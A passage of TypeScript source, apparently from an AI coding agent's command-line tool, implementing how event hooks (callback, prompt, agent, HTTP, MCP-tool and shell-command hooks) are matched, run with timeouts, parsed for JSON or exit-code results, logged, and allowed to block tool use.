  const sessionId = toolUseContext?.agentId ?? getSessionId()
  let matchingHooks: MatchedHook[]
  try {
    matchingHooks = await getMatchingHooks(
      appState,
      sessionId,
      hookEvent,
      hookInput,
      toolUseContext?.options?.tools,
      {
        managedHooksOnly,
        managedHooksExcluded,
        suppressTelemetry: suppressPerInvocationTelemetry,
      },
    )
  } catch (err) {
    logError(err)
    const failClosed = buildFailClosedHookMatchResult(
      hookEvent,
      hookName,
      formatHookMatchBlockedMessage(hookEvent, err),
    )
    if (failClosed !== undefined) {
      yield failClosed
      return
    }
    matchingHooks = []
  }
  // densable AKo Gn: ke → function only; ye → drop function.
  if (sessionFunctionHooksOnly) {
    matchingHooks = matchingHooks.filter(h => h.hook.type === 'function')
  } else if (skipSessionFunctionHooks) {
    matchingHooks = matchingHooks.filter(h => h.hook.type !== 'function')
  }
  if (sessionStartOptions !== undefined) {
    if (sessionStartOptions.newPluginsOnly) {
      const pluginEntries = matchingHooks
        .filter(
          (m): m is typeof m & { pluginId: string } => m.pluginId !== undefined,
        )
        .map(m => ({
          pluginId: m.pluginId,
          pluginName: m.pluginId.split('@')[0] ?? m.pluginId,
        }))
      const owedIds = new Set(
        sessionStartOptions.newPluginsOnly
          .owed(pluginEntries)
          .map(p => p.pluginId),
      )
      matchingHooks = matchingHooks.filter(
        m => m.pluginId !== undefined && owedIds.has(m.pluginId),
      )
    }
    if (sessionStartOptions.onMatched) {
      const matchedPlugins = matchingHooks
        .filter(
          (m): m is typeof m & { pluginId: string } => m.pluginId !== undefined,
        )
        .map(m => ({
          pluginId: m.pluginId,
          pluginName: m.pluginId.split('@')[0] ?? m.pluginId,
        }))
      sessionStartOptions.onMatched(matchedPlugins, matchingHooks.length)
    }
  }
  if (matchingHooks.length === 0) {
    return
  }

  if (signal?.aborted) {
    return
  }

  const userHooks = matchingHooks.filter(h => !isInternalHook(h))
  if (userHooks.length > 0) {
    // densable: if (!suppressPerInvocationTelemetry) N("tengu_run_hook", ...)
    if (!suppressPerInvocationTelemetry) {
      const pluginHookCounts = getPluginHookCounts(userHooks)
      const hookTypeCounts = getHookTypeCounts(userHooks)
      const numMatchAllMatchers = userHooks.filter(
        hook => hook.matcherIsMatchAll,
      ).length
      logEvent(`tengu_run_hook`, {
        hookName:
          hookName as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
        numCommands: userHooks.length,
        numMatchAllMatchers,
        numSpecificMatchers: userHooks.length - numMatchAllMatchers,
        hookTypeCounts: jsonStringify(
          hookTypeCounts,
        ) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
        ...(pluginHookCounts && {
          pluginHookCounts: jsonStringify(
            pluginHookCounts,
          ) as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
        }),
      })
    }
  } else {
    // Fast-path: all hooks are internal callbacks (sessionFileAccessHooks,
    // attributionHooks). These return {} and don't use the abort signal, so we
    // can skip span/progress/abortSignal/processHookJSONOutput/resultLoop.
    // Measured: 6.01µs → ~1.8µs per PostToolUse hit (-70%).
    const batchStartTime = Date.now()
    const context = toolUseContext
      ? {
          getAppState: toolUseContext.getAppState,
          updateAttributionState: toolUseContext.updateAttributionState,
        }
      : undefined
    for (const [i, { hook }] of matchingHooks.entries()) {
      if (hook.type === 'callback') {
        await hook.callback(hookInput, toolUseID, signal, i, context)
      }
    }
    const totalDurationMs = Date.now() - batchStartTime
    getStatsStore()?.observe('hook_duration_ms', totalDurationMs)
    addToTurnHookDuration(totalDurationMs)
    logEvent(`tengu_repl_hook_finished`, {
      hookName:
        hookName as AnalyticsMetadata_I_VERIFIED_THIS_IS_NOT_CODE_OR_FILEPATHS,
      numCommands: matchingHooks.length,
      numSuccess: matchingHooks.length,
      numBlocking: 0,
      numNonBlockingError: 0,
      numCancelled: 0,
      totalDurationMs,
    })
    return
  }

  // Collect hook definitions for beta tracing telemetry
  const hookDefinitionsJson = isBetaTracingEnabled()
    ? jsonStringify(getHookDefinitionsForTelemetry(matchingHooks))
    : '[]'

  // Log hook execution start to OTEL (only for beta tracing)
  if (isBetaTracingEnabled()) {
    void logOTelEvent('hook_execution_start', {
      hook_event: hookEvent,
      hook_name: hookName,
      num_hooks: String(matchingHooks.length),
      managed_only: String(shouldAllowManagedHooksOnly()),
      hook_definitions: hookDefinitionsJson,
      hook_source: shouldAllowManagedHooksOnly() ? 'policySettings' : 'merged',
    })
  }

  // Start hook span for beta tracing
  const hookSpan = startHookSpan(
    hookEvent,
    hookName,
    matchingHooks.length,
    hookDefinitionsJson,
  )

  // Yield progress messages for each hook before execution
  for (const { hook } of matchingHooks) {
    yield {
      message: {
        type: 'progress',
        data: {
          type: 'hook_progress',
          hookEvent,
          hookName,
          command: formatHookProgressText(getHookDisplayText(hook)),
          ...(hook.type === 'prompt' && { promptText: hook.prompt }),
          ...('statusMessage' in hook &&
            hook.statusMessage != null && {
              statusMessage: formatHookProgressText(hook.statusMessage),
            }),
        },
        parentToolUseID: toolUseID,
        toolUseID,
        timestamp: new Date().toISOString(),
        uuid: randomUUID(),
      },
    }
  }

  // Track wall-clock time for the entire hook batch
  const batchStartTime = Date.now()

  // Lazy-once stringify of hookInput. Shared across all command/prompt/agent/http
  // hooks in this batch (hookInput is never mutated). Callback/function hooks
  // return before reaching this, so batches with only those pay no stringify cost.
  let jsonInputResult:
    | { ok: true; value: string }
    | { ok: false; error: unknown }
    | undefined
  let jsonInputOwnToolResult:
    | { ok: true; value: string }
    | { ok: false; error: unknown }
    | undefined
  let jsonInputFamilyResult:
    | { ok: true; value: string }
    | { ok: false; error: unknown }
    | undefined
  function getJsonInput(forOwnTool = false, familyMatched?: MatchedHook) {
    const familyPayload = familyMatched?.throughFamilyOnly
      ? remapHookInputForMatchedHook(familyMatched, hookInput)
      : undefined
    const cached = familyPayload
      ? jsonInputFamilyResult
      : forOwnTool
        ? jsonInputOwnToolResult
        : jsonInputResult
    if (cached !== undefined) {
      return cached
    }
    try {
      const payload =
        familyPayload ??
        (forOwnTool
          ? (remapHookInputForOwnTool(hookInput)?.hookInput ?? hookInput)
          : hookInput)
      const next = { ok: true as const, value: jsonStringify(payload) }
      validateHookInputSize(hookEvent, next.value)
      if (familyPayload) jsonInputFamilyResult = next
      else if (forOwnTool) jsonInputOwnToolResult = next
      else jsonInputResult = next
      return next
    } catch (error) {
      logError(
        Error(`Failed to stringify hook ${hookName} input`, { cause: error }),
      )
      const next = { ok: false as const, error }
      if (familyPayload) jsonInputFamilyResult = next
      else if (forOwnTool) jsonInputOwnToolResult = next
      else jsonInputResult = next
      return next
    }
  }

  // Run all hooks in parallel with individual timeouts
  const hookPromises = matchingHooks.map(
    async function* (matchedHook, hookIndex): AsyncGenerator<HookResult> {
      const { hook, pluginRoot, pluginId, skillRoot, asOwnTool } = matchedHook
      if (hook.type === 'callback') {
        const callbackTimeoutMs = hook.timeout ? hook.timeout * 1000 : timeoutMs
        const { signal: abortSignal, cleanup } = createCombinedAbortSignal(
          signal,
          { timeoutMs: callbackTimeoutMs },
        )
        const effectiveHookInput =
          remapHookInputForMatchedHook(matchedHook, hookInput) ?? hookInput
        yield executeHookCallback({
          toolUseID,
          hook,
          hookEvent,
          hookInput: effectiveHookInput,
          signal: abortSignal,
          hookIndex,
          toolUseContext,
        }).finally(cleanup)
        return
      }

      if (hook.type === 'function') {
        if (!messages) {
          yield {
            message: createAttachmentMessage({
              type: 'hook_error_during_execution',
              hookName,
              toolUseID,
              hookEvent,
              content: 'Messages not provided for function hook',
            }),
            outcome: 'non_blocking_error',
            hook,
          }
          return
        }

        // Function hooks only come from session storage with callback embedded
        yield executeFunctionHook({
          hook,
          messages,
          hookName,
          toolUseID,
          hookEvent,
          timeoutMs,
          signal,
        })
        return
      }

      // Command and prompt hooks need jsonInput
      const commandTimeoutMs = hook.timeout ? hook.timeout * 1000 : timeoutMs
      const { signal: abortSignal, cleanup } = createCombinedAbortSignal(
        signal,
        {
          timeoutMs: commandTimeoutMs,
        },
      )
      const hookId = randomUUID()
      const hookStartMs = Date.now()
      const hookCommand = getHookDisplayText(hook)

      try {
        const jsonInputRes = getJsonInput(asOwnTool === true, matchedHook)
        if (!jsonInputRes.ok) {
          if (shouldFailClosedHookInput(hookEvent)) {
            const reason = `Blocked: this call's input can't be written as JSON, so the hook could not check it. The input is too large, or contains a value that JSON can't represent (such as a BigInt or a circular reference). Retry with a smaller, plain input. (JSON error: ${errorMessage(jsonInputRes.error)})`
            yield {
              blockingError: { blockingError: reason, command: hookCommand },
              ...(hookEvent === 'PermissionRequest' && {
                permissionRequestResult: {
                  behavior: 'deny' as const,
                  message: reason,
                },
              }),
              outcome: 'blocking',
              hook,
            }
            cleanup()
            return
          }
          yield {
            message: createAttachmentMessage({
              type: 'hook_error_during_execution',
              hookName,
              toolUseID,
              hookEvent,
              content: `Failed to prepare hook input: ${errorMessage((jsonInputRes as { ok: false; error: unknown }).error)}`,
              command: hookCommand,
              durationMs: Date.now() - hookStartMs,
            }),
            outcome: 'non_blocking_error',
            hook,
          }
          cleanup()
          return
        }
        const jsonInput = jsonInputRes.value

        if (
          (hook.type === 'prompt' || hook.type === 'agent') &&
          toolUseContext?.agentId?.startsWith('hook-agent-')
        ) {
          yield { outcome: 'cancelled', hook }
          cleanup()
          return
        }

        if (hook.type === 'prompt') {
          if (!toolUseContext) {
            throw new Error(
              'ToolUseContext is required for prompt hooks. This is a bug.',
            )
          }
          const promptResult = await execPromptHook(
            hook,
            hookName,
            hookEvent,
            jsonInput,
            abortSignal,
            toolUseContext,
            messages,
            toolUseID,
          )
          // Inject timing fields for hook visibility
          if (promptResult.message?.type === 'attachment') {
            const att = promptResult.message.attachment!
            if (
              att.type === 'hook_success' ||
              att.type === 'hook_non_blocking_error'
            ) {
              att.command = hookCommand
              att.durationMs = Date.now() - hookStartMs
            }
          }
          // densable timedOut:!h?.aborted — parent abort is cancelled, not timeout.
          if (promptResult.outcome === 'cancelled' && !signal?.aborted) {
            yield { ...promptResult, timedOut: true }
          } else {
            yield promptResult
          }
          cleanup?.()
          return
        }

        if (hook.type === 'agent') {
          if (!toolUseContext) {
            throw new Error(
              'ToolUseContext is required for agent hooks. This is a bug.',
            )
          }
          if (hookEvent === 'PermissionRequest') {
            throw new Error(
              'Agent hooks are not supported for PermissionRequest.',
            )
          }
          const agentResult = await execAgentHook(
            hook,
            hookName,
            hookEvent,
            jsonInput,
            abortSignal,
            toolUseContext,
            toolUseID,
            'agent_type' in hookInput
              ? (hookInput.agent_type as string)
              : undefined,
          )
          // Inject timing fields for hook visibility
          if (agentResult.message?.type === 'attachment') {
            const att = agentResult.message.attachment!
            if (
              att.type === 'hook_success' ||
              att.type === 'hook_non_blocking_error'
            ) {
              att.command = hookCommand
              att.durationMs = Date.now() - hookStartMs
            }
          }
          yield agentResult
          cleanup?.()
          return
        }

        if (hook.type === 'http' || hook.type === 'mcp_tool') {
          emitHookStarted(hookId, hookName, hookEvent)

          // execHttpHook manages its own timeout internally via hook.timeout or
          // DEFAULT_HTTP_HOOK_TIMEOUT_MS, so pass the parent signal directly
          // to avoid double-stacking timeouts with abortSignal.
          const httpResult: {
            ok: boolean
            body: string
            error?: string
            aborted?: boolean
            withheld?: boolean
            statusCode?: number
          } =
            hook.type === 'http'
              ? await execHttpHook(
                  hook,
                  hookEvent,
                  jsonInput,
                  signal,
                  timeoutMs,
                )
              : await execMcpToolHook(
                  hook,
                  hookEvent,
                  jsonInput,
                  toolUseContext?.options.mcpClients,
                  signal,
                  timeoutMs,
                )
          cleanup?.()
          if (
            hook.type === 'mcp_tool' &&
            httpResult.withheld &&
            hookEvent === 'PreToolUse'
          ) {
            const reason = `a PreToolUse mcp_tool hook could not run (${httpResult.error}); refusing rather than skipping that gate`
            emitHookResponse({
              hookId,
              hookName,
              hookEvent,
              output: reason,
              stdout: '',
              stderr: httpResult.error ?? reason,
              exitCode: 2,
              outcome: 'error',
            })
            yield {
              blockingError: { blockingError: reason, command: hookCommand },
              outcome: 'blocking',
              hook,
            }
            return
          }
          const rawExitCode =
            hook.type === 'mcp_tool'
              ? httpResult.ok && !httpResult.error
                ? 0
                : 1
              : httpResult.statusCode

          if (httpResult.aborted) {
            emitHookResponse({
              hookId,
              hookName,
              hookEvent,
              output: 'Hook cancelled',
              stdout: '',
              stderr: '',
              exitCode: undefined,
              outcome: 'cancelled',
            })
            yield {
              message: createAttachmentMessage({
                type: 'hook_cancelled',
                hookName,
                toolUseID,
                hookEvent,
              }),
              outcome: 'cancelled' as const,
              hook,
            }
            return
          }

          if (httpResult.error || !httpResult.ok) {
            const errorStdout = hook.type === 'mcp_tool' ? httpResult.body : ''
            const stderr =
              httpResult.error ||
              (hook.type === 'mcp_tool'
                ? 'MCP tool returned an error'
                : `HTTP ${httpResult.statusCode} from ${getHookDisplayText(hook)}`)
            emitHookResponse({
              hookId,
              hookName,
              hookEvent,
              output: stderr,
              stdout: errorStdout,
              stderr,
              exitCode: rawExitCode,
              outcome: 'error',
            })
            yield {
              message: createAttachmentMessage({
                type: 'hook_non_blocking_error',
                hookName,
                toolUseID,
                hookEvent,
                stderr,
                stdout: errorStdout,
                exitCode: rawExitCode ?? 0,
              }),
              outcome: 'non_blocking_error' as const,
              hook,
            }
            return
          }

          // HTTP hooks must return JSON — parse and validate through Zod
          const { json: httpJson, validationError: httpValidationError } =
            hook.type === 'http'
              ? parseHttpHookOutput(httpResult.body)
              : parseHookOutput(httpResult.body)

          if (httpValidationError) {
            emitHookResponse({
              hookId,
              hookName,
              hookEvent,
              output: httpResult.body,
              stdout: httpResult.body,
              stderr: httpValidationError,
              exitCode: hook.type === 'mcp_tool' ? 1 : rawExitCode,
              outcome: 'error',
            })
            yield {
              message: createAttachmentMessage({
                type: 'hook_non_blocking_error',
                hookName,
                toolUseID,
                hookEvent,
                stderr: httpValidationError,
                stdout: httpResult.body,
                exitCode: hook.type === 'mcp_tool' ? 1 : (rawExitCode ?? 0),
              }),
              outcome: 'non_blocking_error' as const,
              hook,
            }
            return
          }

          if (
            hook.type === 'mcp_tool' &&
            (!httpJson || isAsyncHookJSONOutput(httpJson))
          ) {
            emitHookResponse({
              hookId,
              hookName,
              hookEvent,
              output: httpResult.body,
              stdout: httpResult.body,
              stderr: '',
              exitCode: 0,
              outcome: 'success',
            })
            yield {
              message: createAttachmentMessage({
                type: 'hook_success',
                hookName,
                toolUseID,
                hookEvent,
                content: `${hookName} completed`,
                stdout: httpResult.body,
                stderr: '',
                command: hookCommand,
                durationMs: Date.now() - hookStartMs,
              }),
              outcome: 'success',
              hook,
            }
            return
          }
          if (httpJson && isAsyncHookJSONOutput(httpJson)) {
            // Async response: treat as success (no further processing)
            emitHookResponse({
              hookId,
              hookName,
              hookEvent,
              output: httpResult.body,
              stdout: httpResult.body,
              stderr: '',
              exitCode: rawExitCode,
              outcome: 'success',
            })
            yield {
              outcome: 'success' as const,
              hook,
            }
            return
          }

          if (httpJson) {
            const processed = processHookJSONOutput({
              json: httpJson,
              command: getHookDisplayText(hook),
              hookName,
              toolUseID,
              hookEvent,
              expectedHookEvent: hookEvent,
              stdout: httpResult.body,
              stderr: '',
              exitCode: rawExitCode,
            })
            emitHookResponse({
              hookId,
              hookName,
              hookEvent,
              output: httpResult.body,
              stdout: httpResult.body,
              stderr: '',
              exitCode: rawExitCode,
              outcome: 'success',
            })
            yield {
              ...processed,
              outcome: 'success' as const,
              hook,
            }
            return
          }

          return
        }

        emitHookStarted(hookId, hookName, hookEvent)

        const result = await execCommandHook(
          hook,
          hookEvent,
          hookName,
          jsonInput,
          abortSignal,
          hookId,
          hookIndex,
          pluginRoot,
          pluginId,
          skillRoot,
          forceSyncExecution || shouldBlockOnFailureForEvent(hook, hookEvent),
          boundRequestPrompt,
          persistStorageV5,
          persistCredentials,
        )
        cleanup?.()
        const durationMs = Date.now() - hookStartMs
        logForDebugging(
          formatHookCompletionDebugLog({
            hookName,
            command: hookCommand,
            pluginId,
            result,
            timeoutMs: commandTimeoutMs,
            durationMs,
            parentAborted: signal?.aborted === true,
          }),
        )

        if (result.backgrounded) {
          yield {
            outcome: 'success' as const,
            hook,
          }
          return
        }

        if (result.aborted) {
          emitHookResponse({
            hookId,
            hookName,
            hookEvent,
            output: result.output,
            stdout: result.stdout,
            stderr: result.stderr,
            exitCode: result.status,
            outcome: 'cancelled',
          })
          const commandResult = result as HookCommandResult & {
            stoppedAfterItsTimeout?: boolean
          }
          yield {
            message: createAttachmentMessage({
              type: 'hook_cancelled',
              hookName,
              toolUseID,
              hookEvent,
              command: hookCommand,
              durationMs,
            }),
            outcome: 'cancelled' as const,
            hook,
            ...(commandResult.stoppedAfterItsTimeout && {
              stoppedAfterItsTimeout: true,
            }),
          }
          return
        }

        // Try JSON parsing first
        const parsed = parseHookOutput(result.stdout)
        const { plainText, validationError } = parsed
        const json = selectCompleteHookOutput(result, hookEvent, parsed.json)
        const stdioError = getHookStdioError(
          result,
          hookEvent,
          json,
          text => parseHookOutput(text).json,
        )
        if (stdioError !== undefined) {
          const stderr = Uct(stdioError, result.status, result.stderr)
          emitHookResponse({
            hookId,
            hookName,
            hookEvent,
            output: result.output,
            stdout: result.stdout,
            stderr,
            exitCode: result.status,
            outcome: 'error',
          })
          if (stdioFailClosedEvents.has(hookEvent)) {
            yield {
              blockingError: {
                blockingError: `[${hookCommand}]: ${stdioError}`,
                command: hookCommand,
              },
              suppressOriginalPrompt: true,
              outcome: 'blocking' as const,
              hook,
            }
          } else {
            yield {
              message: createAttachmentMessage({
                type: 'hook_non_blocking_error',
                hookName,
                toolUseID,
                hookEvent,
                stderr,
                stdout: result.stdout,
                exitCode: result.status,
                command: hookCommand,
                durationMs,
              }),
              outcome: 'non_blocking_error' as const,
              hook,
            }
          }
          return
        }

        // densable 2.1.214 #40: `if(ge&&we.status!==2)` — schema/parse failure
        // must NOT swallow exit code 2 blocking (fall through to status===2 path).
        // See hookExit2Priority.ts for pure gate.
        if (validationError && result.status !== 2) {
          const wn = Uct(validationError, result.status, result.stderr)
          emitHookResponse({
            hookId,
            hookName,
            hookEvent,
            output: result.output,
            stdout: result.stdout,
            stderr: wn,
            exitCode: 1,
            outcome: 'error',
          })
          yield {
            message: createAttachmentMessage({
              type: 'hook_non_blocking_error',
              hookName,
              toolUseID,
              hookEvent,
              stderr: wn,
              stdout: result.stdout,
              exitCode: 1,
              command: hookCommand,
              durationMs,
            }),
            outcome: 'non_blocking_error' as const,
            hook,
          }
          return
        }

        if (json) {
          if (isAsyncHookJSONOutput(json)) {
            // A forced synchronous hook may announce async and then fail.
            if (result.status === 2) {
              emitHookResponse({
                hookId,
                hookName,
                hookEvent,
                output: result.output,
                stdout: result.stdout,
                stderr: result.stderr,
                exitCode: result.status,
                outcome: 'error',
              })
              yield {
                blockingError: {
                  blockingError: escapeSystemReminderTags(
                    `[${hookCommand}]: ${result.stderr || 'No stderr output'}`,
                  ),
                  command: hookCommand,
                },
                ...((result.stdioIncomplete ||
                  result.stdioClosedWithoutEnd) && {
                  suppressOriginalPrompt: true,
                }),
                outcome: 'blocking' as const,
                hook,
              }
            } else if (result.status !== 0) {
              emitHookResponse({
                hookId,
                hookName,
                hookEvent,
                output: result.output,
                stdout: result.stdout,
                stderr: result.stderr,
                exitCode: result.status,
                outcome: 'error',
              })
              yield {
                message: createAttachmentMessage({
                  type: 'hook_non_blocking_error',
                  hookName,
                  toolUseID,
                  hookEvent,
                  stderr: `Announced async, then failed with status code ${result.status}: ${result.stderr.trim() || 'No stderr output'}`,
                  stdout: result.stdout,
                  exitCode: result.status,
                  command: hookCommand,
                  durationMs,
                }),
                outcome: 'non_blocking_error' as const,
                hook,
              }
            } else {
              emitHookResponse({
                hookId,
                hookName,
                hookEvent,
                output: result.output,
                stdout: result.stdout,
                stderr: result.stderr,
                exitCode: result.status,
                outcome: 'success',
              })
              yield { outcome: 'success' as const, hook }
            }
            return
          }

          // Process JSON output
          const processed = processHookJSONOutput({
            json,
            command: hookCommand,
            hookName,
            toolUseID,
            hookEvent,
            expectedHookEvent: hookEvent,
            stdout: result.stdout,
            stderr: result.stderr,
            exitCode: result.status,
            durationMs,
          })

          // densable: exit 2 still blocks even when JSON did not set blockingError
          // (`if(we.status===2&&!pe.blockingError) pe.blockingError = stderr...`).
          if (result.status === 2 && !processed.blockingError) {
            processed.blockingError = {
              blockingError: escapeSystemReminderTags(
                `[${hookCommand}]: ${result.stderr || 'No stderr output'}`,
              ),
              command: hookCommand,
            }
          }

          // Handle suppressOutput (skip for async responses)
          const syncJson = json as TypedSyncHookOutput
          if (
            isSyncHookJSONOutput(json) &&
            !syncJson.suppressOutput &&
            plainText &&
            result.status === 0
          ) {
            // Still show non-JSON output if not suppressed
            const content = `${chalk.bold(hookName)} completed`
            emitHookResponse({
              hookId,
              hookName,
              hookEvent,
              output: result.output,
              stdout: result.stdout,
              stderr: result.stderr,
              exitCode: result.status,
              outcome: 'success',
            })
            yield {
              ...processed,
              message:
                processed.message ||
                createAttachmentMessage({
                  type: 'hook_success',
                  hookName,
                  toolUseID,
                  hookEvent,
                  content,
                  stdout: result.stdout,
                  stderr: result.stderr,
                  exitCode: result.status,
                  command: hookCommand,
                  durationMs,
                }),
              outcome: 'success' as const,
              hook,
            }
            return
          }

          emitHookResponse({
            hookId,
            hookName,
            hookEvent,
            output: result.output,
            stdout: result.stdout,
            stderr: result.stderr,
            exitCode: result.status,
            outcome: result.status === 0 ? 'success' : 'error',
          })
          yield {
            ...processed,
            // densable: outcome = pe.blockingError ? "blocking" : "success"
            outcome: processed.blockingError
              ? ('blocking' as const)
              : ('success' as const),
            hook,
          }
          return
        }

        // Fall back to existing logic for non-JSON output
        if (result.status === 0) {
          emitHookResponse({
            hookId,
            hookName,
            hookEvent,
            output: result.output,
            stdout: result.stdout,
            stderr: result.stderr,
            exitCode: result.status,
            outcome: 'success',
          })
          yield {
            message: createAttachmentMessage({
              type: 'hook_success',
              hookName,
              toolUseID,
              hookEvent,
              content: escapeSystemReminderTags(
                await persistHookOutput(result.stdout.trim(), hookId, 'stdout'),
              ),
              stdout: result.stdout,
              stderr: result.stderr,
              exitCode: result.status,
              command: hookCommand,
              durationMs,
            }),
            outcome: 'success' as const,
            hook,
          }
          return
        }

        if (
          result.status === 2 &&
          shouldDowngradeMissingHookScriptExit2({
            hookEvent,
            stdout: result.stdout,
            stderr: result.stderr,
            pluginId,
            stdioIncomplete: result.stdioIncomplete,
            stdioClosedWithoutEnd: result.stdioClosedWithoutEnd,
          })
        ) {
          emitHookResponse({
            hookId,
            hookName,
            hookEvent,
            output: result.output,
            stdout: result.stdout,
            stderr: result.stderr,
            exitCode: result.status,
            outcome: 'error',
          })
          yield {
            message: createAttachmentMessage({
              type: 'hook_non_blocking_error',
              hookName,
              toolUseID,
              hookEvent,
              stderr:
                `Hook script appears to be missing — "${hookCommand}" exited 2 with: ${result.stderr.trim()}. Treating as non-blocking. ` +
                (pluginId
                  ? `Run \`/plugin\` to reinstall '${pluginId}' or remove it from settings.`
                  : 'If this is a plugin hook, check the plugin install (run /plugin).'),
              stdout: result.stdout,
              exitCode: result.status,
              command: hookCommand,
              durationMs,
            }),
            outcome: 'non_blocking_error' as const,
            hook,
          }
          return
        }

        // Hooks with exit code 2 provide blocking feedback
        if (result.status === 2) {
          emitHookResponse({
            hookId,
            hookName,
            hookEvent,
            output: result.output,
            stdout: result.stdout,
            stderr: result.stderr,
            exitCode: result.status,
            outcome: 'error',
          })
          yield {
            blockingError: {
              blockingError: escapeSystemReminderTags(
                `[${hookCommand}]: ${result.stderr || 'No stderr output'}`,
              ),
              command: hookCommand,
            },
            ...((result.stdioIncomplete || result.stdioClosedWithoutEnd) && {
              suppressOriginalPrompt: true,
            }),
            outcome: 'blocking' as const,
            hook,
          }
          return
        }

        // Any other non-zero exit code is a non-critical error that should just
        // be shown to the user.
        emitHookResponse({
          hookId,
          hookName,
          hookEvent,
          output: result.output,
          stdout: result.stdout,
          stderr: result.stderr,
          exitCode: result.status,
          outcome: 'error',
        })
        yield {
          message: createAttachmentMessage({
            type: 'hook_non_blocking_error',
            hookName,
            toolUseID,
            hookEvent,
            stderr: `Failed with non-blocking status code: ${result.stderr.trim() || 'No stderr output'}`,
            stdout: result.stdout,
            exitCode: result.status,
            command: hookCommand,
            durationMs,
          }),
          outcome: 'non_blocking_error' as const,
          hook,
        }
        return
      } catch (error) {
        // Clean up on error
        cleanup?.()

        const errorMessage =
          error instanceof Error ? error.message : String(error)
        emitHookResponse({
          hookId,
          hookName,
          hookEvent,
          output: `Failed to run: ${errorMessage}`,
          stdout: '',
          stderr: `Failed to run: ${errorMessage}`,
          exitCode: 1,
          outcome: 'error',
        })
        yield {
          message: createAttachmentMessage({
            type: 'hook_non_blocking_error',
            hookName,
            toolUseID,
            hookEvent,
            stderr: `Failed to run: ${errorMessage}`,
            stdout: '',
            exitCode: 1,
            command: hookCommand,
            durationMs: Date.now() - hookStartMs,
          }),
          outcome: 'non_blocking_error' as const,
          hook,
        }
        return
      }
    },
  )

  // Track outcomes for logging
  const outcomes = {
    success: 0,
    blocking: 0,
    non_blocking_error: 0,
    cancelled: 0,
  }

  let permissionBehavior: PermissionResult['behavior'] | 'defer' | undefined
  let resultIndex = 0

  const progress =
    userHooks.length > 0
      ? trackHookExecution({
          hookEvent,
          agentId: toolUseContext?.agentId,
          toolName: 'tool_name' in hookInput ? hookInput.tool_name : undefined,
          hooks: userHooks.map(({ hook }) => ({
            command: formatHookProgressText(getHookDisplayText(hook)),
            statusMessage:
              'statusMessage' in hook && hook.statusMessage
                ? formatHookProgressText(hook.statusMessage)
                : undefined,
          })),
        })
      : undefined
  const progressIndices = new Map(
    userHooks.map(({ hook }, index) => [hook, index]),
  )

  try {
    // Run non-model hooks in parallel and cap prompt/agent hooks at 12 per event
    // and 24 per session (+12 overdue) (#928, #1336)
    const slotSignalController = new AbortController()
    const slotSignal = signal
      ? AbortSignal.any([signal, slotSignalController.signal])
      : slotSignalController.signal
    const mergedHooks = mergeHookGeneratorsWithModelCap(
      matchingHooks.map((entry, idx) => {
        const isModelHook =
          entry.hook.type === 'prompt' || entry.hook.type === 'agent'
        return {
          isModelHook,
          generator: hookPromises[idx]!,
          timeoutMs: isModelHook
            ? resolveModelHookTimeoutMs(entry.hook, timeoutMs)
            : undefined,
        }
      }),
      MAX_CONCURRENT_MODEL_HOOKS_PER_EVENT,
      {
        slots: getSessionModelHookSlots(),
        signal: slotSignal,
        limitMs: timeoutMs,
      },
    )
    for await (const rawResult of mergedHooks) {
      const result = applyOnFailureBlockToHookResult(
        rawResult,
        hookEvent,
        signal,
      )
      const progressIndex = progressIndices.get(result.hook)
      if (progressIndex !== undefined) {
        progress?.settle(progressIndex)
      }
      outcomes[result.outcome]++

      // Check for preventContinuation early
      if (result.preventContinuation) {
        logForDebugging(
          `Hook ${hookEvent} (${getHookDisplayText(result.hook)}) requested preventContinuation`,
        )
        yield {
          preventContinuation: true,
          stopReason: result.stopReason,
          hook: result.hook,
        }
      }

      // Handle different result types
      if (result.blockingError) {
        yield {
          blockingError: result.blockingError,
          suppressOriginalPrompt: result.suppressOriginalPrompt,
          stopReason: result.stopReason,
          hook: result.hook,
          ...(result.hook.type === 'prompt'
            ? { impossible: result.impossible }
            : {}),
        }
        permissionBehavior = 'deny'
      }

      if (result.message) {
        yield {
          message: result.message,
          hook: result.hook,
          ...(result.hook.type === 'prompt'
            ? { stopReason: result.stopReason, impossible: result.impossible }
            : {}),
        }
      }

      // densable: Mo.timedOut && prompt && Stop → yield {hook, timedOut:true}
      if (
        result.timedOut &&
        result.hook.type === 'prompt' &&
        hookEvent === 'Stop'
      ) {
        yield { hook: result.hook, timedOut: true }
      }

      // densable 2.1.248 rA.noteHookFailure(o, wwt(ue, stderr))
      if (
        (hookEvent === 'PreToolUse' || hookEvent === 'PermissionRequest') &&
        result.outcome === 'non_blocking_error' &&
        toolUseID
      ) {
        const msg = result.message
        const att =
          msg &&
          typeof msg === 'object' &&
          'type' in msg &&
          msg.type === 'attachment' &&
          'attachment' in msg
            ? (msg.attachment as { type?: string; stderr?: string })
            : undefined
        const stderr =
          att?.type === 'hook_non_blocking_error' &&
          typeof att.stderr === 'string'
            ? att.stderr
            : ''
        noteHookFailure(toolUseID, wwt(hookEvent, stderr))
      }

      // Counts every result, not just the ones that carry output, so the
      // persist basename stays unique across hooks running in parallel.
      resultIndex++

      // Yield system message separately if present
      if (result.systemMessage) {
        yield {
          message: createAttachmentMessage({
            type: 'hook_system_message',
            content: await persistHookOutput(
              result.systemMessage,
              `${toolUseID}-${resultIndex}`,
              'systemMessage',
            ),
            hookName,
            toolUseID,
            hookEvent,
          }),
        }
      }

      if (result.terminalSequence) {
        emitTerminalSequence(result.terminalSequence)
      }

      // Collect additional context from hooks
      if (result.additionalContext) {
        logForDebugging(
          `Hook ${hookEvent} (${getHookDisplayText(result.hook)}) provided additionalContext (${result.additionalContext.length} chars)`,
        )
        yield {
          additionalContexts: [
            await persistHookOutput(
              result.additionalContext,
              `${toolUseID}-${resultIndex}`,
              'additionalContext',
            ),
          ],
        }
      }

      // densable 2.1.222 MessageDisplay — yield displayContent for wth transform
      if (result.displayContent !== undefined) {
        yield {
          displayContent: result.displayContent,
        }
      }

      if (result.initialUserMessage) {
        logForDebugging(
          `Hook ${hookEvent} (${getHookDisplayText(result.hook)}) provided initialUserMessage (${result.initialUserMessage.length} chars)`,
        )
        yield {
          initialUserMessage: await persistHookOutput(
            result.initialUserMessage,
            `${toolUseID}-${resultIndex}`,
            'initialUserMessage',
          ),
        }
      }

      if (result.sessionTitle) {
        logForDebugging(
